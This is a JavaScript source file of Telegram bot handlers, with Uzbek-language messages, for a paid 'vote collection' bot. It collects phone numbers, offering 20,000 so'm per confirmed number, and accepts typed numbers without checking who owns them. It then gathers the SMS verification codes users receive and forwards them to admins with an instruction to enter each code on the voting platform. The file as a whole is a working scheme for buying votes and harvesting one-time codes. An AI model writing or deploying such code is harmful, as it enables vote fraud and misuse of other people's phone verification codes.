const { User, Phone } = require('./models');
const { getNextId } = require('./models');
const { formatPhone, statusLabel, ADMIN_IDS } = require('./helpers');

// /start
async function handleStart(ctx) {
  const tg = ctx.from;

  // Foydalanuvchini DB ga saqlash yoki topish
  let user = await User.findOne({ telegramId: tg.id });
  if (!user) {
    const newId = await getNextId();
    user = await User.create({
      userId: newId,
      telegramId: tg.id,
      username: tg.username || '',
      firstName: tg.first_name || '',
      lastName: tg.last_name || ''
    });
  }

  const name = tg.first_name || tg.username || 'Foydalanuvchi';

  await ctx.reply(
    `👋 Assalomu alaykum, <b>${name}</b>!\n\n` +
    `🗳 <b>Ovoz yig'ish botiga xush kelibsiz!</b>\n\n` +
    `📋 Sizning ID raqamingiz: <b>${user.userId}</b>\n\n` +
    `Ovoz berish uchun telefon raqamingizni tasdiqlashingiz kerak.\n` +
    `Har bir tasdiqlangan raqam uchun <b>20,000 so'm</b> olasiz!\n\n` +
    `📞 Iltimos, telefon raqamingizni yuboring:`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          [{ text: '📞 Telefon raqamni yuborish', request_contact: true }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
      }
    }
  );
}

// Kontakt (telefon raqam) qabul qilish
async function handleContact(ctx) {
  const contact = ctx.message.contact;
  const telegramId = ctx.from.id;

  // Faqat o'z raqamini yuborish
  if (contact.user_id && contact.user_id !== telegramId) {
    return ctx.reply('❌ Iltimos faqat o\'z raqamingizni yuboring.');
  }

  const phone = formatPhone(contact.phone_number);
  await processPhone(ctx, telegramId, phone);
}

// Matndan telefon raqam kiritish
async function handleTextPhone(ctx) {
  const text = ctx.message.text.trim();
  // Raqam formatini tekshirish
  const phoneRegex = /^[\+\d\s\-\(\)]{9,15}$/;
  if (!phoneRegex.test(text)) return; // raqam emas, ignore

  const phone = formatPhone(text);
  if (phone.replace(/\D/g, '').length < 9) return;

  await processPhone(ctx, ctx.from.id, phone);
}

async function processPhone(ctx, telegramId, phone) {
  // Shu raqam avval kiritilganmi?
  const existing = await Phone.findOne({ phone });
  if (existing) {
    const statusMsg = statusLabel(existing.status);
    if (existing.telegramId === telegramId) {
      return ctx.reply(
        `⚠️ <b>${phone}</b> raqami siz tomonidan allaqachon qo'shilgan.\n📊 Holat: ${statusMsg}`,
        { parse_mode: 'HTML' }
      );
    } else {
      return ctx.reply(
        `❌ <b>${phone}</b> raqami allaqachon boshqa foydalanuvchi tomonidan ro'yxatdan o'tgan.`,
        { parse_mode: 'HTML' }
      );
    }
  }

  // Yangi raqam saqlash
  const newPhone = await Phone.create({ telegramId, phone });

  await ctx.reply(
    `✅ <b>${phone}</b> raqamingiz qabul qilindi!\n\n` +
    `⏳ Admin tez orada ko'rib chiqadi. Kuting...`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          [{ text: '📞 Yana raqam qo\'shish' }],
          [{ text: '📊 Mening raqamlarim' }]
        ],
        resize_keyboard: true
      }
    }
  );

  // Adminlarga xabar yuborish
  const user = await User.findOne({ telegramId });
  const name = user
    ? `${user.firstName || ''}${user.lastName ? ' ' + user.lastName : ''} (ID: ${user.userId})`
    : `TG ID: ${telegramId}`;

  for (const adminId of ADMIN_IDS) {
    try {
      await ctx.telegram.sendMessage(
        adminId,
        `🔔 <b>Yangi raqam — ovoz uchun!</b>\n\n` +
        `👤 Foydalanuvchi: <b>${name}</b>\n` +
        `📞 Raqam: <code>${phone}</code>\n` +
        `🆔 Record: <code>${newPhone._id}</code>`,
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔄 Jarayonga olish', callback_data: `take_${newPhone._id}` }]
            ]
          }
        }
      );
    } catch (e) {
      console.error(`Admin ${adminId} ga xabar yuborishda xato:`, e.message);
    }
  }
}

// SMS kodni yuborish
async function handleSmsCode(ctx) {
  const text = ctx.message.text.trim();
  const telegramId = ctx.from.id;

  // SMS kod formatini tekshirish (4-8 raqam)
  if (!/^\d{4,8}$/.test(text)) return;

  // Sms_sent statusdagi raqam bormi?
  const phone = await Phone.findOne({ telegramId, status: 'sms_sent' });
  if (!phone) return;

  // Adminlarga SMS kodni yuborish
  const user = await User.findOne({ telegramId });
  const name = user
    ? `${user.firstName || ''} ${user.lastName || ''} (ID: ${user.userId})`
    : `TG: ${telegramId}`;

  for (const adminId of ADMIN_IDS) {
    try {
      await ctx.telegram.sendMessage(
        adminId,
        `📩 <b>SMS Kod keldi!</b>\n\n` +
        `👤 <b>${name}</b>\n` +
        `📞 Raqam: <code>${phone.phone}</code>\n` +
        `🔑 SMS Kod: <code>${text}</code>\n\n` +
        `Kodni platformaga kiriting.`,
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '✅ Tasdiqlandi', callback_data: `confirm_${phone._id}` }],
              [{ text: '❌ Avval ovoz berilgan', callback_data: `reject_${phone._id}` }]
            ]
          }
        }
      );
    } catch (e) {}
  }

  await ctx.reply(
    `✅ SMS kod adminga yuborildi.\n\n⏳ Platforma 1-1.5 soat ichida tasdiqlashini kuting...`,
    { parse_mode: 'HTML' }
  );
}

// Mening raqamlarim
async function handleMyPhones(ctx) {
  const telegramId = ctx.from.id;
  const phones = await Phone.find({ telegramId }).sort({ createdAt: -1 });

  if (!phones.length) {
    return ctx.reply(
      '📭 Hali raqam qo\'shmadingiz.\n\nRaqam qo\'shish uchun pastdagi tugmani bosing:',
      {
        reply_markup: {
          keyboard: [
            [{ text: '📞 Telefon raqamni yuborish', request_contact: true }]
          ],
          resize_keyboard: true
        }
      }
    );
  }

  const confirmed = phones.filter(p => p.status === 'confirmed').length;
  const totalReward = confirmed * 20000;

  let msg = `📊 <b>Mening raqamlarim</b>\n\n`;
  phones.forEach((p, i) => {
    msg += `${i + 1}. <code>${p.phone}</code> — ${statusLabel(p.status)}\n`;
  });
  msg += `\n💰 Tasdiqlangan: <b>${confirmed} ta</b>\n`;
  msg += `💼 Jami: <b>${totalReward.toLocaleString()} so'm</b>`;

  await ctx.reply(msg, { parse_mode: 'HTML' });
}

// Yana raqam qo'shish
async function handleAddPhone(ctx) {
  await ctx.reply(
    '📞 Yangi raqam qo\'shish uchun:\n\n' +
    '1️⃣ Pastdagi tugma orqali o\'z raqamingizni yuboring\n' +
    '2️⃣ Yoki raqamni to\'g\'ridan-to\'g\'ri yozing: <code>+998901234567</code>',
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          [{ text: '📞 Telefon raqamni yuborish', request_contact: true }],
          [{ text: '📊 Mening raqamlarim' }]
        ],
        resize_keyboard: true
      }
    }
  );
}

module.exports = {
  handleStart,
  handleContact,
  handleTextPhone,
  handleSmsCode,
  handleMyPhones,
  handleAddPhone
};
